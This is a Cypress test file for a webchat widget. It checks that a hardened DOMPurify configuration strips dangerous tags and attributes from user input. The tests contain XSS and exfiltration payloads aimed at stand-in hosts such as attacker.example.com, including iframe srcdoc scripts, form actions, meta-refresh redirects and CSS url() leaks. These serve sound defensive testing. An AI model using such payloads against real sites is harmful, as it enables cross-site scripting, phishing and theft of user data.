// eslint-disable-next-line @typescript-eslint/triple-slash-reference
/// <reference path="../support/index.d.ts" />

// WCH-SI10-001: verifies dangerous tags and attributes removed from the DOMPurify
// allow-list no longer survive sanitization. disableHtmlInput:false so HTML reaches
// sanitizeHTML rather than being pre-stripped by stripHtmlToInertText.

describe("sanitize — DOMPurify allow-list hardening (WCH-SI10-001)", () => {
	const init = () =>
		cy
			.visitWebchat()
			.initMockWebchat({
				settings: {
					widgetSettings: {
						disableHtmlInput: false,
					},
				},
			})
			.openWebchat()
			.startConversation();

	const typeAndSend = (value: string) => {
		cy.get(".webchat-input-message-label")
			.contains("label", "Type something here…")
			.invoke("attr", "for")
			.then(inputId => {
				cy.get(`#${inputId}`).type(value, { parseSpecialCharSequences: false });
			});
		cy.get('[aria-label="Send message"]').click();
	};

	// --- removed tags ---

	it("strips <iframe> (was in allow-list — enables srcdoc XSS)", () => {
		init();
		typeAndSend('<iframe srcdoc="<script>alert(1)</script>">content</iframe>');
		cy.get("[data-cognigy-webchat-root]").find("iframe").should("not.exist");
	});

	it("strips <base> (was in allow-list — rewrites all relative URLs on host page)", () => {
		init();
		typeAndSend('<base href="https://attacker.example.com">');
		cy.get("[data-cognigy-webchat-root]").find("base").should("not.exist");
	});

	it("strips <form> (was in allow-list — posts user data to attacker URL)", () => {
		init();
		typeAndSend('<form action="https://attacker.example.com"><input name="q"></form>');
		cy.get("[data-cognigy-webchat-root]").find("form").should("not.exist");
	});

	it("strips <object> (was in allow-list — loads arbitrary external content)", () => {
		init();
		typeAndSend('<object data="https://attacker.example.com/payload.swf"></object>');
		cy.get("[data-cognigy-webchat-root]").find("object").should("not.exist");
	});

	it("strips <embed> (was in allow-list — loads arbitrary external content)", () => {
		init();
		typeAndSend('<embed src="https://attacker.example.com/payload.swf">');
		cy.get("[data-cognigy-webchat-root]").find("embed").should("not.exist");
	});

	it("strips <style> (was in allow-list — CSS injection and attribute exfiltration)", () => {
		init();
		typeAndSend("<style>body{background:url(https://attacker.example.com)}</style>");
		cy.get("[data-cognigy-webchat-root]").find("style").should("not.exist");
	});

	it("strips <meta> (was in allow-list — HTTP redirect and CSP bypass)", () => {
		init();
		typeAndSend('<meta http-equiv="refresh" content="0;url=https://attacker.example.com">');
		cy.get("[data-cognigy-webchat-root]").find("meta").should("not.exist");
	});

	it("strips <link> (was in allow-list — loads external stylesheets)", () => {
		init();
		typeAndSend('<link rel="stylesheet" href="https://attacker.example.com/evil.css">');
		cy.get("[data-cognigy-webchat-root]").find("link").should("not.exist");
	});

	// --- removed attributes ---

	it("strips formaction attribute (enables phishing without <form action>)", () => {
		init();
		typeAndSend('<button formaction="https://attacker.example.com">Click</button>');
		cy.get("[data-cognigy-webchat-root]").find("[formaction]").should("not.exist");
	});

	it("strips srcdoc attribute (inline HTML document in iframe — XSS vector)", () => {
		init();
		typeAndSend('<iframe srcdoc="<script>alert(1)</script>">fallback</iframe>');
		cy.get("[data-cognigy-webchat-root]").find("[srcdoc]").should("not.exist");
	});

	it("strips style attribute (inline CSS injection and UI redressing)", () => {
		init();
		typeAndSend('<span style="background:url(https://attacker.example.com)">text</span>');
		cy.get("[data-cognigy-webchat-root]").find("[style]").should("not.exist");
	});

	// --- regression guards ---

	it("preserves plain text content after sanitization", () => {
		init();
		typeAndSend("hello world");
		cy.get(".webchat-chat-history").contains("hello world");
	});

	it("preserves href on anchor tags", () => {
		init();
		typeAndSend('<a href="https://cognigy.com">Cognigy</a>');
		cy.get(".webchat-chat-history").contains("Cognigy");
	});

	describe("Accessibility (WCAG 2.2 AA)", () => {
		it("chat surface has no a11y violations after sanitized input is sent", () => {
			init();
			typeAndSend('<iframe src="https://evil.example.com">content</iframe>normal');
			cy.checkA11yCompliance("[data-cognigy-webchat-root]");
		});
	});
});
